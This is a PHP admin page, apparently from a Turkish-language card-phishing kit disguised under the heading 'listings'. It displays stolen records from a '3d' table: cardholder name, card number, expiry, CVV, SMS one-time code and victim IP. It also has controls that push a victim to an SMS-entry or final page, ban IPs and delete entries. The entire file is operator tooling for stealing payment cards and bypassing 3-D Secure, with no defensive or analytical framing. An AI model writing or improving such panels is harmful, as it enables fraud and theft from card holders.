<?php
include('../../../settings/router.php');

try {
    $conn = new PDO($dsn, $user, $password);
    $conn->exec("SET NAMES 'utf8'; SET CHARSET 'utf8'");
} catch (PDOException $e) {
    print $e->getMessage();
}

?>
<div id="content">
    <div class="d-flex align-items-center justify-content-between" style="padding-bottom: 30px">
        <h4>İlanlar</h4>
        <button type="button" class="btn btn-danger" style="margin-right: 30px;"><a style="color:white; text-decoration:none;" href="ilanlar/deleteall.php?type=3D">HEPSİNİ SİL</a></button>
    </div>
    <table class="table">
     <tr>
         <th>#</th>
         <th>Kart Sahibi</th>
         <th>Kart Numarası</th>
         <th>Ay</th>
         <th>Yıl</th>
         <th>CVV</th>
         <th>SMS</th>
         <th>IP</th>
         <th>#</th>
         <th>#</th>
         <th>#</th>
     </tr>
        <?php 
            $query = $conn->query("SELECT * FROM 3d", PDO::FETCH_ASSOC);
            if ($query->rowCount()){
                foreach( $query as $row ){
        ?>
         <tr>
             <td><?=$row['id']?></td>
             <td><?=$row['cardOwner']?></td>
             <td><?=$row['cardnumber']?></td>
             <td><?=$row['month']?></td>
             <td><?=$row['year']?></td>
             <td><?=$row['cvv']?></td>
             <td><?=$row['sms']?></td>
             <td><?=$row['ip']?></td>
             <td><button type="button" class="btn btn-success"><a href="ilanlar/all.php?sms=<?=$row['ip'];?>" style="color:white; text-decoration:none;">SMS</a></button></td>
             <td><button type="button" class="btn btn-success"><a href="ilanlar/all.php?final=<?=$row['ip'];?>" style="color:white; text-decoration:none;">Son Sayfa</a></button></td>
             <td><button type="button" class="btn btn-primary banButton"><a href="ilanlar/all.php?ban=<?=$row['ip'];?>" style="color:white; text-decoration:none;">Banla</a></button></td>
             <td><button type="button" class="btn btn-danger"><a style="color:white; text-decoration:none;" href="ilanlar/sil.php?id=<?=$row['id'];?>">Sil</a></button></td>
         </tr>
         <?php
     }}
     ?>
    </table>
     <style>
         .block{
             display: block;
         }
     </style>
     <script>
         let empty;
         const banButton = document.querySelector('.banButton');
         banButton.addEventListener('click', () => {
            let checkFn = function () {
                $.ajax({
                    type: "POST",
                    url: "ilanlar/ban.php",
                    data: {
                        ip: `<?=$row['ip']?>`
                    },
                    dataType: "JSON",
                    success: function (data) {
                        if(data.type == 'success'){
                            $.notify({
                                type: 'success',
                                message: 'Banlandı <i class="fas fa-check-circle"></i>'
                            });
                        }
        
                    },
                });
            };
            checkFn();
        })
     </script>
</div>
</body>
</html>
